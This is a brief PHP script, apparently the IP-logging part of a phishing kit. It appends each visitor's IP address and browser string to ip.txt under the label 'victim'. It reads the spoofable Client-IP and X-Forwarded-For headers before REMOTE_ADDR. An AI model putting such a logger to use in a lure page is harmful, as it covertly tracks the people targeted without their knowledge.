<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = htmlspecialchars($_SERVER['HTTP_CLIENT_IP']) . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR']) . "\r\n";
} else {
    $ipaddress = htmlspecialchars($_SERVER['REMOTE_ADDR']) . "\r\n";
}

$useragent = " User-Agent: ";
$browser = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

if ($fp) {
    fwrite($fp, $victim);
    fwrite($fp, $ipaddress);
    fwrite($fp, $useragent);
    fwrite($fp, $browser);
    fwrite($fp, "\r\n");
    fclose($fp);
}
